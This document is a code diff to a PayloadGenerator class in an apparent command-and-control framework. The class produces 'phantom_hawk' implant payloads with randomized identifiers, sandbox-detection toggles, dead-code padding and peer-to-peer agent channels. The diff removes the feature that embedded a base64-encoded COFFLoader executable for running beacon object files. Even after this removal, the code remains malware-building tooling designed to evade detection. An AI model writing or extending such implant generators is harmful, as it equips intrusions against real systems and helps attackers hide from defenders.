@@ -210,8 +210,6 @@ class PayloadGenerator:
 
         m_encrypt_data = poly.generate_random_name('encrypt_data_')
         m_decrypt_data = poly.generate_random_name('decrypt_data_')
-        m_execute_bof = poly.generate_random_name('execute_bof_')
-        m_load_coffloader = poly.generate_random_name('load_coffloader_')
 
         v_c2 = poly.generate_random_name('c2_')
         v_agent_id = poly.generate_random_name('agent_id_')
@@ -276,13 +274,6 @@ class PayloadGenerator:
 
         listener_id_for_registration = 'web_app_default'
 
-        import base64
-        try:
-            with open(os.path.join(os.path.dirname(__file__), 'COFFLoader64.exe'), 'rb') as f:
-                coffloader_exe_data = f.read()
-            coffloader_b64 = base64.b64encode(coffloader_exe_data).decode('utf-8')
-        except FileNotFoundError:
-            coffloader_b64 = ""
 
         template_path = os.path.join(os.path.dirname(__file__), 'phantom_hawk_template.py')
         with open(template_path, 'r') as f:
@@ -327,8 +318,6 @@ class PayloadGenerator:
             m_setup_p2p_communication=m_setup_p2p_communication,
             m_encrypt_data=m_encrypt_data,
             m_decrypt_data=m_decrypt_data,
-            m_execute_bof=m_execute_bof,
-            m_load_coffloader=m_load_coffloader,
             v_c2=v_c2,
             v_agent_id=v_agent_id,
             v_headers=v_headers,
@@ -364,7 +353,7 @@ class PayloadGenerator:
             v_p2p_discovery_timer=v_p2p_discovery_timer,
             v_p2p_command_queue=v_p2p_command_queue,
             v_sandbox_enabled=v_sandbox_enabled,
-            v_coffloader_b64=coffloader_b64,
+            v_coffloader_b64="",
             sandbox_check_enabled=not disable_sandbox,  # Set to False if sandbox is disabled
             dead_code_2=dead_code_2,
             dead_code_3=dead_code_3,
